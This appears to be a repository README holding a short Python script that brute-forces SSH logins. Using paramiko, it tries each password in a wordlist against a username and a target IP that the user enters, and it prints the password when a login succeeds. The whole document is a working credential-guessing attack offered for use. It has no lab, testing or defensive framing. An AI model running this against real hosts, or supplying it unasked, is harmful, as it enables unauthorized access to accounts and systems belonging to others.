# -Brute-Force-Password-Cracking-Script
#The script takes a list of possible passwords (wordlist) and attempts to "guess" the correct password for a target account. This example demonstrates a brute-force method to crack an SSH login (which can be replaced with other protocols).
import paramiko

def ssh_bruteforce(target_ip, username, password_list):
    for password in password_list:
        try:
            # Create an SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password)
            print(f"Password found: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed attempt with password: {password}")
            continue

# Main Program
if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    username = input("Enter SSH username: ")
    password_list = ["password123", "admin", "1234", "letmein"]  # Sample password list
    ssh_bruteforce(target_ip, username, password_list)
